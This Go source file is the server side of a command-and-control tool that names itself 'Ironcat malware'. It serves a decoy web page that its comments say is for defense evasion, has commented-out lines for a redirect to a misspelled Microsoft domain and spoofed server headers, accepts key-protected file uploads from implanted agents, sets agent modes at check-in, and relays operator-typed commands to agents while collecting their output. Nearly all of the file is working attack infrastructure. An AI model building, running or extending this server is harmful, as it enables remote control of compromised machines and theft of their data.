package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/gin-gonic/gin"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

//Log functionality
func malware_log_create() {
	dt := time.Now()

	logName := "/var/log/ironcat-malware.log" + dt.String()
	f, err := os.Create(logName)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()
}

func malware_log(message string) {
	f, err := os.OpenFile("/var/log/ironcat-malware.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	msg := message
	_, err2 := f.WriteString(msg)
	if err2 != nil {
		log.Fatal(err)
	}
	defer f.Close()
}

func mode_set() string {
	fmt.Println("Enter Mode: ")
	var m string
	scanner := bufio.NewScanner(os.Stdin)
	if scanner.Scan() {
		m = scanner.Text()
		fmt.Println("Setting Mode for All Agents To: ", m)
	}
	return m
}

func main() {

	mode := mode_set()

	fmt.Printf("Launching Ironcat Server")
	r := gin.Default()
	r.LoadHTMLGlob("*.html")
	//set server headers
	r.Use(func(c *gin.Context) {
		//c.Writer.Header().Set("Server", "Kestrel")
		//c.Writer.Header().Set("tls_version", "tls1.3")
		//c.Writer.Header().Set("x-rtag", "ARRPrd")
	})
	//displays index.html use for defense evasion
	r.GET("/", func(c *gin.Context) {

		//c.Redirect(301, "https://micorosoft.com")
		c.HTML(http.StatusOK, "index.html", nil)
	})

	//initial capability endpoint.
	r.GET("/ironcat", func(c *gin.Context) {
		c.JSON(200, gin.H{
			"message": "We create our own demons.",
		})
	})

	//C2 devices will checking according to their internal settings with a http request
	//Response will be given based on the desired task for the client to perform
	//CMD C2 will require a separate cmdctl endpoint that recieves a post.

	r.POST("/upload", func(c *gin.Context) {
		fmt.Printf("Upload Requested")
		d := c.Request.Header.Get("Domain")
		k := c.Request.Header.Get("Key")
		if k == "invincibleironcat" {
			// single file
			file, err := c.FormFile("file")
			check(err)
			log.Println(file.Filename)
			dst := "./" + d + "/" + file.Filename
			// Upload the file to specific dst.
			c.SaveUploadedFile(file, dst)
		}
	})

	r.GET("checkin", func(c *gin.Context) {
		fmt.Println(mode)

		switch mode {
		default:
			c.Writer.Header().Add("Mode", "0")
			c.HTML(http.StatusOK, "index.html", nil)
			mode = mode_set()
			defer c.Request.Body.Close()
		case "0":
			c.Writer.Header().Add("Mode", "0")
			c.HTML(http.StatusOK, "index.html", nil)
			mode = mode_set()
			defer c.Request.Body.Close()
		case "1":
			c.Writer.Header().Add("Mode", "1")
			c.HTML(http.StatusOK, "index.html", nil)
			defer c.Request.Body.Close()
		case "2":
			c.Writer.Header().Add("Mode", "2")
			c.HTML(http.StatusOK, "index.html", nil)
			defer c.Request.Body.Close()
		}

	})

	r.GET("cmdctrl", func(c *gin.Context) {
		fmt.Println("Enter Command: ", c.ClientIP)
		var command_input string
		scanner := bufio.NewScanner(os.Stdin)
		if scanner.Scan() {
			command_input = scanner.Text()
			fmt.Println("Sending Command", command_input)
		}
		//fmt.Scanln(&command_input)
		//fmt.Println("Sending ", command_input)
		c.JSON(200, gin.H{"cmd": command_input})
		defer c.Request.Body.Close()
	})

	r.POST("cmdctrl", func(c *gin.Context) {
		buf := new(bytes.Buffer)
		buf.ReadFrom(c.Request.Body)
		str := buf.String()
		fmt.Println(str)
		mode = mode_set()
	})

	r.Run("0.0.0.0:80") // listen and serve on 0.0.0.0:8080 (for windows "localhost:8080")
}